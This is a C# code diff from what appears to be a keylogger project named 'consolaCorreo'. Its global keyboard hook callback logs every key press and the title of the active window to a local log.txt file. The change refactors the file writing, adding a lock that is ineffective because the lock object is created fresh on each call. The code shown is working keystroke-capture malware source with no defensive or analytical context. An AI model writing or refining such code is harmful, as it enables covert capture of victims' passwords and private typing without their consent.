@@ -32,16 +32,27 @@ namespace consolaCorreo
         public static IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
+            object locker = new object();
+
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
+                lock (locker)
+                {
+                    string logFilePath = Application.StartupPath + @"\log.txt";
 
-                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.WriteLine("ventana: "+ GetActiveWindowTitle());
-                
-                sw.WriteLine((Keys)vkCode);
-                sw.Close();
+                    using (FileStream file = new FileStream(logFilePath, FileMode.Append, FileAccess.Write, FileShare.None))
+                    {
+                        StreamWriter writer = new StreamWriter(file);
+                        writer.WriteLine("ventana: " + GetActiveWindowTitle());
+                        writer.WriteLine((Keys)vkCode);
+                        writer.Flush();
+                        file.Close();
+                    }
+
+                }
+               
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
